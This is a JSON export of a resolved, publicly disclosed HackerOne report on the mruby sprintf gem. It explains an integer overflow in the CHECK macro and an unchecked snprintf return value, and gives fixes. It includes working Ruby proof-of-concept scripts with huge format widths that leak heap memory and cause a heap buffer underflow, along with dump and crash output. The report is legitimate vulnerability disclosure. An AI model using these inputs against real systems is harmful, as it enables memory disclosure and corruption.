{"id":212239,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTIyMzk=","url":"https://hackerone.com/reports/212239","title":"sprintf gem - format string combined attack","state":"Closed","substate":"resolved","severity_rating":"none","readable_substate":"Resolved","created_at":"2017-03-10T11:35:39.810Z","submitted_at":"2017-03-10T11:35:39.810Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"aerodudrizzt","url":"/aerodudrizzt","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/098/646/ebd692682f9cff0731c0021d35f72330a3c88a8c_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-14T21:25:31.099Z","bug_reporter_agreed_on_going_public_at":"2017-03-14T21:25:31.054Z","team_member_agreed_on_going_public_at":"2017-03-14T21:11:33.166Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"In the sprintf gem, NOT included in mruby-engine, there are severe vulnerabilities, including information leak, and heap buffer overflow. Here are the technical details.\n\nTechnical Error 1:\n==============\nThe ```CHECK(l)``` macro can sometimes receive negative values, that will bypass the size checks, since the resize loop is:\n```cpp\n#define CHECK(l) do {\\\n/*  int cr = ENC_CODERANGE(result);*/\\\n  while ((l) \u003e= bsiz - blen) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n/*  ENC_CODERANGE_SET(result, cr);*/\\\n  buf = RSTRING_PTR(result);\\\n} while (0)\n```\nOne example for reaching a negative \"l\" value is in the \"G\" format when the width is \"2 ** 31 - 20\", causing ```need``` to be ```MIN_INT```:\n```cpp\n        if ((flags\u0026FWIDTH) \u0026\u0026 need \u003c width)\n            need = width;\n        need += 20;\n\n        CHECK(need);\n        n = snprintf(\u0026buf[blen], need, fbuf, fval);\n        blen += n;\n```\n\nProposed Fix:\n-------------------\nSince there are several such IOFs, the best fix will be a robust check inside the macro itself.\nThe macro should add another check to raise an exception in case ```l \u003c 0```.\n\nTechnical Error 2:\n==============\nStill in the \"G\" format, in case of a huge width, the ```snprintf``` call will fail, returning ```-1```:\n```cpp\n        n = snprintf(\u0026buf[blen], need, fbuf, fval);\n        blen += n;\n```\nThis means that we can decrement ```blen``` by 1 for each such format primitive. \n\nInformation Leak PoC Script:\n------------------------------------------\n```ruby\nsecret_password = \"thisismysuperdupersecretpassword\"\n\nf = 1234567890.12345678\nunique = sprintf(\"% 2147483628G\", f)\n\nsample1 = \"1\" * 50\nsample2 = \"2\" * 100\nsample3 = \"3\" * 200\n\nprint unique.length\nprint unique\n```\nOn 32bit machines, the ```mrb_str_resize(-1)``` will create a string of length ```-1``` with a data buffer realloced with size 0 (= -1 + 1). The resulting output is:\n```\nhexdump sprintf_leak.bin\n0000000 312d 0000 0000 0000 0000 0000 0000 0000\n0000010 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0000080 0000 0000 0000 0039 0000 3131 3131 3131\n0000090 3131 3131 3131 3131 3131 3131 3131 3131\n*\n00000b0 3131 3131 3131 3131 3131 3131 0000 0071\n00000c0 0000 3232 3232 3232 3232 3232 3232 3232\n00000d0 3232 3232 3232 3232 3232 3232 3232 3232\n*\n0000120 3232 3232 3232 0000 0000 0000 0000 00d1\n0000130 0000 3333 3333 3333 3333 3333 3333 3333\n0000140 3333 3333 3333 3333 3333 3333 3333 3333\n*\n00001f0 3333 3333 3333 3333 3333 0000 0000 05c9\n0000200 0000 ca20 b76f ca20 b76f ebd8 095d ebd8\n0000210 095d 0000 0000 0000 0000 0000 0000 0000\n0000220 0000 0000 0000 0000 0000 0000 0000 0000\n*\n00007c0 0000 05c8 0000 0010 0000 001b 0000 0001\n00007d0 0000 e048 095d 0029 0000 6874 7369 7369\n00007e0 796d 7573 6570 6472 7075 7265 6573 7263\n00007f0 7465 6170 7373 6f77 6472 0000 0000 0021\n0000800 0000 0810 0000 e2c0 0959 0000 0000 0020\n0000810 0000 e0f0 095d f200 095d 0000 0000 0029\n0000820 0000 6874 7369 7369 796d 7573 6570 6472\n0000830 7075 7265 6573 7263 7465 6170 7373 6f77\n0000840 6472 0000 0000 0019 0000 2025 3132 3734\n0000850 3834 3633 3832 0047 0000 0000 0000 0021\n0000860 0000 0810 0000 e2c0 0959 0000 0000 000d\n0000870 0000 e108 095d f260 095d 0000 0000 0019\n0000880 0000 2025 3132 3734 3834 3633 3832 0047\n0000890 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008a0 0959 0000 0000 0031 0000 0000 0000 0000\n00008b0 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008c0 0959 0000 0000 0032 0000 0000 0000 0000\n00008d0 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008e0 0959 0000 0000 0033 0000 0000 0000 0000\n00008f0 0000 0000 0000 dd31 0001 0000 0000 0000\n0000900 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0001000\n```\nAnd a close look will tell us that:\n* The print of ```unique.length``` returned ```-1```: 0x2d, 0x31\n* Our \"secret password\" can be found at the last memory block of the dump.\n\nHeap buffer underflow PoC Script:\n---------------------------------------------------\n```ruby\nf = 1234567890.12345678\nformat = \"% 2147483628G\" * 10 + \"!!!!!!!!!!!\"\n\nstr1 = \"1\" * 120\nunique = sprintf(format, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f)\nprint str1\n```\nDecrementing ```blen``` 10 times, will result in a buffer underflow of 10 bytes, that will write '!' on the ```str1```, as can be seen in the dump:\n```\n*** Error in `./mruby': double free or corruption (out): 0x09905b30 ***\n======= Backtrace: =========\n/lib/i386-linux-gnu/libc.so.6(+0x67257)[0xb7530257]\n/lib/i386-linux-gnu/libc.so.6(+0x6d577)[0xb7536577]\n/lib/i386-linux-gnu/libc.so.6(+0x6dd31)[0xb7536d31]\n./mruby[0x804c81b]\n./mruby[0x80593f5]\n./mruby[0x8052760]\n./mruby[0x805a3a0]\n./mruby[0x80596bb]\n./mruby[0x80596f8]\n./mruby[0x804ce4d]\n./mruby[0x8049762]\n./mruby[0x8049c48]\n/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb74e1637]\n./mruby[0x80491d1]\n======= Memory map: ========\n08048000-080ed000 r-xp 00000000 08:01 2883651    /XXX/mruby/bin/mruby\n080ed000-080ee000 r--p 000a4000 08:01 2883651   /XXX/mruby/bin/mruby\n080ee000-080ef000 rw-p 000a5000 08:01 2883651   /XXX/mruby/bin/mruby\n098c0000-09924000 rw-p 00000000 00:00 0          [heap]\nb7300000-b7321000 rw-p 00000000 00:00 0 \nb7321000-b7400000 ---p 00000000 00:00 0 \nb7495000-b74b1000 r-xp 00000000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1\nb74b1000-b74b2000 rw-p 0001b000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1\nb74c8000-b74c9000 rw-p 00000000 00:00 0 \nb74c9000-b7678000 r-xp 00000000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb7678000-b7679000 ---p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb7679000-b767b000 r--p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb767b000-b767c000 rw-p 001b1000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb767c000-b767f000 rw-p 00000000 00:00 0 \nb767f000-b76d2000 r-xp 00000000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76d2000-b76d3000 r--p 00052000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76d3000-b76d4000 rw-p 00053000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76e9000-b76ec000 rw-p 00000000 00:00 0 \nb76ec000-b76ee000 r--p 00000000 00:00 0          [vvar]\nb76ee000-b76ef000 r-xp 00000000 00:00 0          [vdso]\nb76ef000-b7711000 r-xp 00000000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nb7711000-b7712000 rw-p 00000000 00:00 0 \nb7712000-b7713000 r--p 00022000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nb7713000-b7714000 rw-p 00023000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nbff43000-bff64000 rw-p 00000000 00:00 0          [stack]\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111!!Aborted (core dumped)\n```\n\nProposed Fix:\n--------------------\nShould check the return value of ```snprintf``` for errors, instead of directly using it by adding it to ```blen```.","vulnerability_information_html":"\u003cp\u003eIn the sprintf gem, NOT included in mruby-engine, there are severe vulnerabilities, including information leak, and heap buffer overflow. Here are the technical details.\u003c/p\u003e\n\n\u003ch1 id=\"technical-error-1\"\u003eTechnical Error 1:\u003c/h1\u003e\n\n\u003cp\u003eThe \u003ccode\u003eCHECK(l)\u003c/code\u003e macro can sometimes receive negative values, that will bypass the size checks, since the resize loop is:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight cpp\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e#define CHECK(l) do {\\\n\u003c/span\u003e\u003cspan class=\"cm\"\u003e/*  int cr = ENC_CODERANGE(result);*/\u003c/span\u003e\u003cspan class=\"cp\"\u003e\\\n  while ((l) \u0026gt;= bsiz - blen) {\\\n    bsiz*=2;\\\n  }\\\n  mrb_str_resize(mrb, result, bsiz);\\\n\u003c/span\u003e\u003cspan class=\"cm\"\u003e/*  ENC_CODERANGE_SET(result, cr);*/\u003c/span\u003e\u003cspan class=\"cp\"\u003e\\\n  buf = RSTRING_PTR(result);\\\n} while (0)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOne example for reaching a negative \u0026quot;l\u0026quot; value is in the \u0026quot;G\u0026quot; format when the width is \u0026quot;2 ** 31 - 20\u0026quot;, causing \u003ccode\u003eneed\u003c/code\u003e to be \u003ccode\u003eMIN_INT\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight cpp\"\u003e\u003ccode\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003eflags\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eFWIDTH\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003eneed\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"n\"\u003ewidth\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"n\"\u003eneed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ewidth\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eneed\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"mi\"\u003e20\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n        \u003cspan class=\"n\"\u003eCHECK\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eneed\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esnprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eblen\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eneed\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efbuf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efval\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eblen\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"proposed-fix\"\u003eProposed Fix:\u003c/h2\u003e\n\n\u003cp\u003eSince there are several such IOFs, the best fix will be a robust check inside the macro itself.\u003cbr\u003e\nThe macro should add another check to raise an exception in case \u003ccode\u003el \u0026lt; 0\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"technical-error-2\"\u003eTechnical Error 2:\u003c/h1\u003e\n\n\u003cp\u003eStill in the \u0026quot;G\u0026quot; format, in case of a huge width, the \u003ccode\u003esnprintf\u003c/code\u003e call will fail, returning \u003ccode\u003e-1\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight cpp\"\u003e\u003ccode\u003e        \u003cspan class=\"n\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esnprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003ebuf\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003eblen\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"n\"\u003eneed\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efbuf\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003efval\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eblen\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis means that we can decrement \u003ccode\u003eblen\u003c/code\u003e by 1 for each such format primitive. \u003c/p\u003e\n\n\u003ch2 id=\"information-leak-poc-script\"\u003eInformation Leak PoC Script:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003esecret_password\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;thisismysuperdupersecretpassword\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003ef\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e1234567890.12345678\u003c/span\u003e\n\u003cspan class=\"n\"\u003eunique\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003esprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;% 2147483628G\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003esample1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e50\u003c/span\u003e\n\u003cspan class=\"n\"\u003esample2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;2\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e100\u003c/span\u003e\n\u003cspan class=\"n\"\u003esample3\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;3\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e200\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eprint\u003c/span\u003e \u003cspan class=\"n\"\u003eunique\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003elength\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eprint\u003c/span\u003e \u003cspan class=\"n\"\u003eunique\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOn 32bit machines, the \u003ccode\u003emrb_str_resize(-1)\u003c/code\u003e will create a string of length \u003ccode\u003e-1\u003c/code\u003e with a data buffer realloced with size 0 (= -1 + 1). The resulting output is:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehexdump sprintf_leak.bin\n0000000 312d 0000 0000 0000 0000 0000 0000 0000\n0000010 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0000080 0000 0000 0000 0039 0000 3131 3131 3131\n0000090 3131 3131 3131 3131 3131 3131 3131 3131\n*\n00000b0 3131 3131 3131 3131 3131 3131 0000 0071\n00000c0 0000 3232 3232 3232 3232 3232 3232 3232\n00000d0 3232 3232 3232 3232 3232 3232 3232 3232\n*\n0000120 3232 3232 3232 0000 0000 0000 0000 00d1\n0000130 0000 3333 3333 3333 3333 3333 3333 3333\n0000140 3333 3333 3333 3333 3333 3333 3333 3333\n*\n00001f0 3333 3333 3333 3333 3333 0000 0000 05c9\n0000200 0000 ca20 b76f ca20 b76f ebd8 095d ebd8\n0000210 095d 0000 0000 0000 0000 0000 0000 0000\n0000220 0000 0000 0000 0000 0000 0000 0000 0000\n*\n00007c0 0000 05c8 0000 0010 0000 001b 0000 0001\n00007d0 0000 e048 095d 0029 0000 6874 7369 7369\n00007e0 796d 7573 6570 6472 7075 7265 6573 7263\n00007f0 7465 6170 7373 6f77 6472 0000 0000 0021\n0000800 0000 0810 0000 e2c0 0959 0000 0000 0020\n0000810 0000 e0f0 095d f200 095d 0000 0000 0029\n0000820 0000 6874 7369 7369 796d 7573 6570 6472\n0000830 7075 7265 6573 7263 7465 6170 7373 6f77\n0000840 6472 0000 0000 0019 0000 2025 3132 3734\n0000850 3834 3633 3832 0047 0000 0000 0000 0021\n0000860 0000 0810 0000 e2c0 0959 0000 0000 000d\n0000870 0000 e108 095d f260 095d 0000 0000 0019\n0000880 0000 2025 3132 3734 3834 3633 3832 0047\n0000890 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008a0 0959 0000 0000 0031 0000 0000 0000 0000\n00008b0 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008c0 0959 0000 0000 0032 0000 0000 0000 0000\n00008d0 0000 0000 0000 0021 0000 8010 0001 e2c0\n00008e0 0959 0000 0000 0033 0000 0000 0000 0000\n00008f0 0000 0000 0000 dd31 0001 0000 0000 0000\n0000900 0000 0000 0000 0000 0000 0000 0000 0000\n*\n0001000\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd a close look will tell us that:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eThe print of \u003ccode\u003eunique.length\u003c/code\u003e returned \u003ccode\u003e-1\u003c/code\u003e: 0x2d, 0x31\u003c/li\u003e\n\u003cli\u003eOur \u0026quot;secret password\u0026quot; can be found at the last memory block of the dump.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"heap-buffer-underflow-poc-script\"\u003eHeap buffer underflow PoC Script:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003ef\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mf\"\u003e1234567890.12345678\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eformat\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;% 2147483628G\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;!!!!!!!!!!!\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003estr1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e120\u003c/span\u003e\n\u003cspan class=\"n\"\u003eunique\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003esprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eformat\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ef\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eprint\u003c/span\u003e \u003cspan class=\"n\"\u003estr1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDecrementing \u003ccode\u003eblen\u003c/code\u003e 10 times, will result in a buffer underflow of 10 bytes, that will write \u0026#39;!\u0026#39; on the \u003ccode\u003estr1\u003c/code\u003e, as can be seen in the dump:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e*** Error in `./mruby\u0026#39;: double free or corruption (out): 0x09905b30 ***\n======= Backtrace: =========\n/lib/i386-linux-gnu/libc.so.6(+0x67257)[0xb7530257]\n/lib/i386-linux-gnu/libc.so.6(+0x6d577)[0xb7536577]\n/lib/i386-linux-gnu/libc.so.6(+0x6dd31)[0xb7536d31]\n./mruby[0x804c81b]\n./mruby[0x80593f5]\n./mruby[0x8052760]\n./mruby[0x805a3a0]\n./mruby[0x80596bb]\n./mruby[0x80596f8]\n./mruby[0x804ce4d]\n./mruby[0x8049762]\n./mruby[0x8049c48]\n/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb74e1637]\n./mruby[0x80491d1]\n======= Memory map: ========\n08048000-080ed000 r-xp 00000000 08:01 2883651    /XXX/mruby/bin/mruby\n080ed000-080ee000 r--p 000a4000 08:01 2883651   /XXX/mruby/bin/mruby\n080ee000-080ef000 rw-p 000a5000 08:01 2883651   /XXX/mruby/bin/mruby\n098c0000-09924000 rw-p 00000000 00:00 0          [heap]\nb7300000-b7321000 rw-p 00000000 00:00 0 \nb7321000-b7400000 ---p 00000000 00:00 0 \nb7495000-b74b1000 r-xp 00000000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1\nb74b1000-b74b2000 rw-p 0001b000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1\nb74c8000-b74c9000 rw-p 00000000 00:00 0 \nb74c9000-b7678000 r-xp 00000000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb7678000-b7679000 ---p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb7679000-b767b000 r--p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb767b000-b767c000 rw-p 001b1000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so\nb767c000-b767f000 rw-p 00000000 00:00 0 \nb767f000-b76d2000 r-xp 00000000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76d2000-b76d3000 r--p 00052000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76d3000-b76d4000 rw-p 00053000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so\nb76e9000-b76ec000 rw-p 00000000 00:00 0 \nb76ec000-b76ee000 r--p 00000000 00:00 0          [vvar]\nb76ee000-b76ef000 r-xp 00000000 00:00 0          [vdso]\nb76ef000-b7711000 r-xp 00000000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nb7711000-b7712000 rw-p 00000000 00:00 0 \nb7712000-b7713000 r--p 00022000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nb7713000-b7714000 rw-p 00023000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so\nbff43000-bff64000 rw-p 00000000 00:00 0          [stack]\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111!!Aborted (core dumped)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"proposed-fix\"\u003eProposed Fix:\u003c/h2\u003e\n\n\u003cp\u003eShould check the return value of \u003ccode\u003esnprintf\u003c/code\u003e for errors, instead of directly using it by adding it to \u003ccode\u003eblen\u003c/code\u003e.\u003c/p\u003e\n","bounty_amount":"100.0","formatted_bounty":"$100","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-04-13T21:11:33.210Z","allow_singular_disclosure_after":-117099934.7348985,"singular_disclosure_allowed":true,"vote_count":3,"voters":["delimitry","eveeez","spetr0x"],"severity":{"rating":"none","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1532015,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","markdown_message":"\u003cp\u003eThank you for reporting this bug! This is an automated response to let you know that we\u0026#39;ve received your issue, and we\u0026#39;ll process it as soon as possible.\u003c/p\u003e\n\n\u003cp\u003eDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your 